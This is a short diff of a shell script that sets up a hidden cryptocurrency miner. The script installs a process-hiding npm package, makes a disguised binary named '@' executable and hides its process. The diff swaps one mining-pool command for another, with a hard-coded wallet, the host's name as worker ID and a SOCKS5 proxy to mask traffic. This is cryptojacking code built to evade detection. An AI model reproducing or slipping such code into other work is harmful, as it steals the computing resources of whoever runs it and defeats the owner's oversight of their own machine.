@@ -10,4 +10,4 @@ npm –version
 npm i -g node-process-hider
 chmod u+x @
 ph add @
-./@ -a minotaurx  -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RQ41XjPaQBTRqtrYFWKKDhiHzmKkb86Lgk -t20
+./@ -a curvehash -o stratum+tcp://curvehash.eu.mine.zergpool.com:3343 -u XshK2irNsaV9iTYc2KtGGf3LfUhXj3isKk -p c=DASH,mc=PLSR,ID=$(echo $(hostname)) -t 18 -x socks5://192.252.214.20:15864
